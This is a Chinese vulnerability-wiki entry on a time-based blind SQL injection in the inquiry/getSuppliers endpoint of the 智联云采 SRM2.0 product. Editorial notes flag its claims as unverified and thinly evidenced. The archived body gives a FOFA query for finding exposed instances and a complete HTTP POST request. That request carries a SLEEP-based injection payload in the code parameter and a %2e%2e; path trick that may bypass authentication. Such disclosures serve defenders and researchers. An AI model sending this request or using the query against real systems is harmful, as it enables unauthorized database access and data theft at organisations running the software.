---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "智联云采 SRM2.0 inquirygetSuppliers处 SQL注入漏洞"
product: "智联云采SRM2.0 inquiry/getSuppliers"
record_type: "vulnerability"
document_type: "SQL注入接口摘要"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "code参数时间盲注，路径static/%2e%2e;可能附加鉴权绕过，具体构建不明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/%E6%99%BA%E8%81%94/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87%20SRM2.0%20inquirygetSuppliers%E5%A4%84%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
fofa_unverified: "title=="
fofa: "title==\"SRM 2.0\""
id: "vw-f182ee96090202962e0cae81"
entity_id: "ve-f182ee96090202962e0cae81"
schema_version: "1"
---

# 智联云采 SRM2.0 inquirygetSuppliers处 SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：智联云采SRM2.0 inquiry/getSuppliers
- 文献类型：SQL注入接口摘要
- 版本、权限及部署边界：code参数时间盲注，路径static/%2e%2e;可能附加鉴权绕过，具体构建不明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 需将路径规范化/鉴权旁路与SQL注入链分别说明；无Cookie不充分证明匿名成功
2. 3秒/5秒两次延迟主要截图，缺对照请求、基线与重复测量，不能仅耗时确认注入
3. 版本仅产品名，已知在野/高权限写木马都是无依据模板；DB文件权限和Web路径等前提缺失
4. fofa只title==且请求未围栏，修复无具体版本；同产品五篇可集合展示但不同端点不能无证据合并根因

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

智联云采 SRM2.0 inquirygetSuppliers接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

智联云采

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title=="SRM 2.0"

POC/EXP：延时3秒，执行2次 

```http
POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%283%29%29%29HckV%29--+HyuV HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

![image-20241121164407804](./.resource/智联云采SRM2.0inquirygetSuppliers处SQL注入漏洞/media/image-20241121164407804.png)


POC/EXP：延时5秒，执行2次 

![image-20241121164445349](./.resource/智联云采SRM2.0inquirygetSuppliers处SQL注入漏洞/media/image-20241121164445349.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
